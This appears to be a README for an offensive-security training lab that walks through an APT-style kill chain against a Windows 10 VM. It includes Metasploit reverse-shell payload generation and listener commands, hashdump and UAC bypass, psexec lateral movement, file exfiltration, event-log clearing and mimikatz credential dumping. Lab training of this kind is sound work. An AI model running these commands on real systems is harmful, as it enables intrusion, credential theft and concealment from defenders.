# RedOps: Adversary Simulation – APT-style Red Team Attack Lab

This project simulates a real-world Advanced Persistent Threat (APT)-style Red Team attack across the full kill chain. It is designed for offensive security training, showcasing techniques in reconnaissance, phishing, privilege escalation, lateral movement, data exfiltration, and evasion.

---

## 🧰 Lab Setup

- **Attacker VM**: Kali Linux / Parrot OS
- **Victim VM**: Windows 10
- **Network Mode**: Host-Only Adapter (Static IPs)

| Machine      | OS           | IP Address     |
|--------------|--------------|----------------|
| Attacker     | Parrot OS    | `HIDDEN`       |
| Victim       | Windows 10   | `HIDDEN`       |

---

## ☠️ Kill Chain Steps Overview

### 1. Reconnaissance

- Tools: `nslookup`, `whois`, `nmap`, `nikto`
- Objective: Gather open ports and services of target.

### 2. Weaponization & Delivery

- Created a malicious payload using:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe > payload.exe

3. Exploitation
Listener set up in msfconsole:

bash
Copy
Edit
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444
run -j
Payload executed on victim → Meterpreter session obtained.

4. Privilege Escalation
Used:

getuid

sysinfo

post/windows/gather/hashdump

Manual enumeration (systeminfo, whoami, net localgroup administrators)

Escalated to NT AUTHORITY\SYSTEM using:

bash
Copy
Edit
exploit/windows/local/bypassuac
5. Lateral Movement
Searched for other hosts in the same network

Used psexec and smb modules for remote code execution

6. Data Exfiltration
Zipped sensitive files

Transferred via Meterpreter or HTTP server

Example:

bash
Copy
Edit
download C:\\Users\\target\\Documents\\secrets.zip
7. Evasion Techniques
Cleared event logs:

bash
Copy
Edit
clearev
Renamed payloads

Used mimikatz for credential dumping with obfuscation
